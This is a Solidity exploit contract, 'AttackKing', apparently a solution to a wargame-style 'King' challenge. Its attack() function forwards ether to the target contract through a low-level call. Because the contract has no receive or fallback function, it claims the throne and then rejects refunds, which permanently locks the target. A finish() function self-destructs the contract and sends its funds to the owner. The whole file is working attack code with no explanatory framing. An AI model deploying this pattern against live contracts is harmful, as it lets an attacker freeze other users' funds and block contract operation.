// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract AttackKing is Ownable {
    constructor() Ownable(msg.sender) {}

    function attack(address _kingContract) external payable onlyOwner {
        // payable(_kingContract).transfer(msg.value); // 2300 gas is not enough to have the call succeed
        (bool sent,) = payable(_kingContract).call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
